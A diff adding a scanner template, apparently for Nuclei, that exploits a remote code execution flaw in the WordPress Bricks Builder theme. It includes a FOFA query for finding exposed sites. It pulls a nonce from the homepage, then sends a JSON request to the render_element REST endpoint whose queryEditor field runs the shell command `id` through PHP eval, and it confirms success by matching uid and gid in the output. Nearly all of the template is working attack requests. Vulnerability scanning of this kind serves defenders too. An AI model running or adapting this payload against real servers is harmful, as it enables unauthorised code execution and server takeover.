@@ -1,0 +1,53 @@
+id: WordPres-Bricks-Builder-RCE
+
+info:
+  name: 由於函數"prepare_query_vars_from_settings "中的一个 eval 函数错误调用，導致遠程代碼執行漏洞，惡意攻擊者可能會利用此漏洞執行惡意代碼，從而獲取服務器權限。
+  author: WLF
+  severity: high
+  metadata: 
+    fofa-query: body="/wp-content/themes/bricks/"
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{to_lower(rand_base(20))}}"
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+
+      - |
+        POST /wp-json/bricks/v1/render_element HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
+        Accept: */*
+        Content-Type: application/json
+        
+        {
+          "postId": "1",
+          "nonce": "{{path}}",
+          "element": {
+            "name": "container",
+            "settings": {
+              "hasLoop": "true",
+              "query": {
+                "useQueryEditor": true,
+                "queryEditor": "throw new Exception(`id`);",
+                "objectType": "post"
+              }
+            }
+          }
+        }
+
+    extractors:
+      - type: regex
+        name: path
+        group: 1
+        regex:
+           - '"nonce":"(\w*)"'
+        internal: true
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"Exception","gid=","uid=")
